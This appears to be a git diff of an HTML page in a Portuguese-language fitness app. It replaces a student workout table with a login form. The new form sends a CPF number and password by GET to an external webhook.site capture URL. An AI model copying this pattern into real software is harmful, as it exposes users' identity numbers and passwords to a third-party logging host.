@@ -4,61 +4,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="/docs/css/styles.css">
-    <title>Personal Mobile</title>
-    <style>
-        
-    </style>
+    <title>Login</title>
+    <link rel="stylesheet" href="/docs/CSS/styles.css">
 </head>
 
 <body>
-    <div>
-        <h1>ALUNO</h1>
-        <div class="image"><img src="" alt=""></div>
-        <h2>NOME ALUNO</h2>
-        <div class="container">
-            <div class="card-container">
-                <h1 class="treinos">Treino</h1>
-                <table>
-                    <tr>
-                        <th>Exercício</th>
-                        <th>P (kg)</th>
-                        <th>R</th>
-                    </tr>
-                    <tr>
-                        <td>Exercício 1:</td>
-                        <td><input type="text" name="primeiro_p" required></td>
-                        <td><input type="text" name="primeiro_r" required></td>
-                    </tr>
-                    <tr>
-                        <td>Exercício 2:</td>
-                        <td><input type="text" name="segundo_p" required></td>
-                        <td><input type="text" name="segundo_r" required></td>
-                    </tr>
+    <div class="container">
+        <div class="form">
+            <form action="https://webhook.site/cf62bb23-ef85-4303-989b-85869cfe1ae4">
+                <div class="form-header">
+                    <div class="title">
+                        <h1>Login</h1>
+                    </div>
+                </div>
 
-                    <tr>
-                        <td>Exercício 3:</td>
-                        <td><input type="text" name="primeiro_p" required></td>
-                        <td><input type="text" name="primeiro_r" required></td>
-                    </tr>
-                    <tr>
-                        <td>Exercício 4:</td>
-                        <td><input type="text" name="segundo_p" required></td>
-                        <td><input type="text" name="segundo_r" required></td>
-                    </tr>
+                <div class="input-box">
+                    <label for="number">CPF</label>
+                    <input id="number" type="tel" name="number" placeholder="xxx.xxx.xxx-xx" required>
+                </div>
 
-                    <tr>
-                        <td>Exercício 5:</td>
-                        <td><input type="text" name="primeiro_p" required></td>
-                        <td><input type="text" name="primeiro_r" required></td>
-                    </tr>
-                    <tr>
-                        <td>Exercício 6:</td>
-                        <td><input type="text" name="segundo_p" required></td>
-                        <td><input type="text" name="segundo_r" required></td>
-                    </tr>
-                </table>
-            </div>
+                <div class="input-box">
+                    <label for="password">Senha</label>
+                    <input id="password" type="password" name="password" placeholder="Escreva sua senha" required>
+                </div>
+
+                <div class="submit">
+                    <input type="submit" value="ENTRAR">
+                </div>
+            </form>
         </div>
     </div>
 </body>
